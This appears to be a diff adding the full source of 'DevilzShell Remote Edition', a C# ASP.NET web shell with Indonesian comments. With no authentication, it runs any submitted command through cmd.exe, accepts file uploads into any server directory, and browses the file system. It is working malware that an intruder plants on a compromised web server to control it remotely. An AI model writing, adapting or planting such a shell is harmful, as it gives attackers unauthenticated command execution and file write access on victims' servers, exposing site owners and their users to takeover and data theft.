@@ -1,0 +1,148 @@
+using System;
+using System.Web;
+using System.IO;
+using System.Diagnostics;
+using System.Collections.Generic;
+using System.Linq;
+
+public class DevilzRemote
+{
+    public void Run(HttpContext context)
+    {
+        context.Response.ContentType = "text/html";
+        
+        // --- KONFIGURASI ---
+        string themeColor = "#ff0000"; // Merah Devilz
+        string bgColor = "#000000";    // Hitam
+        
+        // Parameter
+        string dir = context.Request.QueryString["dir"];
+        string cmd = context.Request.Form["cmd_exec"];
+        
+        string currentDirectory = dir;
+        if (string.IsNullOrEmpty(currentDirectory))
+        {
+             currentDirectory = context.Server.MapPath("~/");
+        }
+        
+        // --- CSS STYLE ---
+        string css = @"
+        <style>
+            body { background-color: " + bgColor + @"; color: " + themeColor + @"; font-family: 'Courier New', monospace; font-size: 14px; margin: 20px; }
+            a { color: #ffffff; text-decoration: none; } a:hover { color: " + themeColor + @"; text-decoration: underline; }
+            input, textarea, select { background: #111; color: #fff; border: 1px solid " + themeColor + @"; padding: 5px; }
+            input[type='submit'] { cursor: pointer; background: " + themeColor + @"; color: #000; font-weight: bold; border: none; }
+            .panel { border: 1px solid " + themeColor + @"; padding: 10px; margin-bottom: 15px; }
+            table { width: 100%; border-collapse: collapse; }
+            th, td { border-bottom: 1px solid #333; padding: 5px; text-align: left; }
+            th { color: #fff; border-bottom: 1px solid " + themeColor + @"; }
+            h1 { border-bottom: 2px solid " + themeColor + @"; padding-bottom: 10px; }
+            .cmd-output { width: 100%; height: 300px; background: #111; border: 1px solid #333; overflow: auto; padding: 10px; color: #ccc; margin-top: 5px; }
+        </style>";
+
+        context.Response.Write("<!DOCTYPE html><html><head><title>DevilzShell Remote</title>" + css + "</head><body>");
+        context.Response.Write("<h1>DevilzShell <span style='font-size:12px; color:#fff;'>Remote Edition</span></h1>");
+
+        // --- INFO SERVER ---
+        context.Response.Write("<div class='panel'>");
+        context.Response.Write("<b>Software:</b> " + context.Request.ServerVariables["SERVER_SOFTWARE"] + "<br>");
+        context.Response.Write("<b>Path:</b> " + currentDirectory + "<br>");
+        context.Response.Write("<b>Quick Jump:</b> <a href='?dir=" + context.Server.UrlEncode(context.Server.MapPath("~/")) + "'>[ HOME ]</a></div>");
+
+        // --- FITUR 1: COMMAND EXECUTION (CMD) ---
+        context.Response.Write("<div class='panel'><b>Command Execution:</b>");
+        context.Response.Write("<form method='post'>");
+        context.Response.Write("<input type='text' name='cmd_exec' style='width: 70%;' placeholder='whoami / dir / ipconfig' value='" + HttpUtility.HtmlAttributeEncode(cmd) + "'> ");
+        context.Response.Write("<input type='submit' value='Execute'>");
+        context.Response.Write("</form>");
+
+        if (!string.IsNullOrEmpty(cmd))
+        {
+            context.Response.Write("<pre class='cmd-output'>");
+            try
+            {
+                ProcessStartInfo psi = new ProcessStartInfo();
+                psi.FileName = "cmd.exe"; 
+                psi.Arguments = "/c " + cmd; 
+                psi.RedirectStandardOutput = true;
+                psi.RedirectStandardError = true;
+                psi.UseShellExecute = false;
+                psi.CreateNoWindow = true;
+
+                using (Process p = Process.Start(psi))
+                {
+                    string output = p.StandardOutput.ReadToEnd();
+                    string error = p.StandardError.ReadToEnd();
+                    context.Response.Write(HttpUtility.HtmlEncode(output + error));
+                }
+            }
+            catch (Exception ex)
+            {
+                context.Response.Write("Error: " + ex.Message);
+            }
+            context.Response.Write("</pre>");
+        }
+        context.Response.Write("</div>");
+
+        // --- FITUR 2: UPLOAD FILE ---
+        if (context.Request.HttpMethod == "POST" && context.Request.Files.Count > 0)
+        {
+            try {
+                HttpPostedFile file = context.Request.Files[0];
+                string savePath = Path.Combine(currentDirectory, Path.GetFileName(file.FileName));
+                file.SaveAs(savePath);
+                context.Response.Write("<div style='color:lime; margin-bottom:10px;'>Upload Success: " + file.FileName + "</div>");
+            } catch (Exception ex) {
+                context.Response.Write("<div style='color:red; margin-bottom:10px;'>Upload Failed: " + ex.Message + "</div>");
+            }
+        }
+
+        context.Response.Write("<div class='panel'><b>File Upload:</b><br>");
+        context.Response.Write("<form method='post' enctype='multipart/form-data'>");
+        context.Response.Write("<input type='file' name='uploadfile'> <input type='submit' value='Upload Server'>");
+        context.Response.Write("</form></div>");
+
+        // --- FITUR 3: FILE MANAGER ---
+        context.Response.Write("<div class='panel'><table>");
+        context.Response.Write("<thead><tr><th>Name</th><th>Size</th><th>Action</th></tr></thead><tbody>");
+        
+        // --- PERBAIKAN DI SINI (Manual Null Check) ---
+        try {
+            DirectoryInfo parentInfo = Directory.GetParent(currentDirectory);
+            if (parentInfo != null) {
+                context.Response.Write("<tr><td><a href='?dir=" + context.Server.UrlEncode(parentInfo.FullName) + "'>[ .. ] UP DIRECTORY</a></td><td>-</td><td>-</td></tr>");
+            }
+        } catch {}
+
+        try
+        {
+            string[] dirs = Directory.GetDirectories(currentDirectory);
+            foreach (string d in dirs)
+            {
+                DirectoryInfo di = new DirectoryInfo(d);
+                context.Response.Write("<tr>");
+                context.Response.Write("<td><a href='?dir=" + context.Server.UrlEncode(di.FullName) + "' style='color:#ffff00;'>" + di.Name + "/</a></td>");
+                context.Response.Write("<td>DIR</td><td>-</td>");
+                context.Response.Write("</tr>");
+            }
+            string[] files = Directory.GetFiles(currentDirectory);
+            foreach (string f in files)
+            {
+                FileInfo fi = new FileInfo(f);
+                context.Response.Write("<tr>");
+                context.Response.Write("<td><a href='#'>" + fi.Name + "</a></td>");
+                context.Response.Write("<td>" + fi.Length + " bytes</td>");
+                context.Response.Write("<td>-</td>");
+                context.Response.Write("</tr>");
+            }
+        }
+        catch (Exception ex)
+        {
+            context.Response.Write("<tr><td colspan='3' style='color:red;'>Access Denied: " + ex.Message + "</td></tr>");
+        }
+        
+        context.Response.Write("</tbody></table></div>");
+        context.Response.Write("<div style='text-align:center; font-size:10px;'>Devilz Remote Edition &copy; 2024</div>");
+        context.Response.Write("</body></html>");
+    }
+}
